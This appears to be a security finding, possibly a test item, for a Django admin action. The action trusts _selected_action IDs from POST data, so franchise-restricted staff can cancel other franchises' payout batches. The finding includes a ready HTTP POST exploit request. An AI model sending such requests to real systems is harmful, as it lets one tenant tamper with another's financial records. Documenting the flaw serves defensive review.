diagnosis: The admin action directly reads _selected_action from POST data and calls PayoutBatch.objects.filter(id__in=payout_ids) rather than operating on the pre-filtered queryset passed by Django admin. Staff restricted to a specific franchise can cancel payout records belonging to any other franchise.
exploit_request:
POST /admin/billing/payoutbatch/ HTTP/1.1
Host: admin.example.com
Cookie: sessionid=partner_admin_session
Content-Type: application/x-www-form-urlencoded

action=cancel_selected_payouts&_selected_action=101&_selected_action=102
